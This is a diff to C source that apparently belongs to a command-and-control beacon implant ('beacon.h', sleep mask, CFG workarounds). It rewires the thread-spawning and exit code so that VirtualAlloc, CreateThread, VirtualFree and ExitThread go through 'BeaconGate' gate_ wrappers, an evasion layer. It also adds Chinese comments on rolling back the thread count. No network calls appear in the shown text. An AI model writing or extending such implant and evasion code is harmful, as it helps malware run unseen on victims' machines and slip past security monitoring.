@@ -1,5 +1,6 @@
 /* code to safely spawn a thread in a way that doesn't piss off CFG on Windows 10 */
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "track_memory.h"
 
@@ -57,7 +58,7 @@ HANDLE _run_thread_start(void (*function)(void *), LPVOID args) {
 	HANDLE hThread = INVALID_HANDLE_VALUE;
 
 	/* allocate our argz bundle */
-	SAFE_THREAD_ARGS * argz = (SAFE_THREAD_ARGS *)VirtualAlloc(NULL, sizeof(SAFE_THREAD_ARGS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	SAFE_THREAD_ARGS * argz = (SAFE_THREAD_ARGS *)gate_VirtualAlloc(NULL, sizeof(SAFE_THREAD_ARGS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (argz == NULL)
 		return INVALID_HANDLE_VALUE;
 
@@ -71,12 +72,12 @@ HANDLE _run_thread_start(void (*function)(void *), LPVOID args) {
 
 	/* create the requested thread */
 	if (trampoline != NULL)
-		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)trampoline, (LPVOID)argz, 0, NULL);
+		hThread = gate_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)trampoline, (LPVOID)argz, 0, NULL);
 
 	/* CreateThread 失败（返回 NULL）：归还 bundle，让 run_thread_start
 	   统一回滚 threadcount */
 	if (hThread == NULL) {
-		VirtualFree(argz, 0, MEM_RELEASE);
+		gate_VirtualFree(argz, 0, MEM_RELEASE);
 		hThread = INVALID_HANDLE_VALUE;
 	}
 
@@ -95,7 +96,7 @@ HANDLE run_thread_start(void(*function)(void *), LPVOID args) {
 		hThread = _run_thread_start(function, args);
 	}
 	else {
-		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)function, (LPVOID)args, 0, NULL);
+		hThread = gate_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)function, (LPVOID)args, 0, NULL);
 	}
 
 	/* 线程没起来就必须回滚计数：否则 threadcount 永不归零，睡眠掩码被
@@ -124,13 +125,13 @@ void safe_exit() {
 		}
 		else {
 			// dlog("safe_exit..EXIT_FUNK_THREAD...ExitThread(0)");
-			ExitThread(0);
+			gate_ExitThread(0);
 		}
 	}
 	else {
 		if (cfg_caution == 1) {
 			// dlog("safe_exit..EXIT_FUNK_PROCESS...CFG CAUTION...WaitForSingleObject INFINITE");
-			HANDLE hExit = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitProcess, NULL, 0, NULL);
+			HANDLE hExit = gate_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitProcess, NULL, 0, NULL);
 			/* CreateThread 失败时 WaitForSingleObject(NULL) 立即返回、safe_exit
 			   静默落空——最后手段直接退出（track_memory_cleanup 已完成） */
 			if (hExit == NULL) {
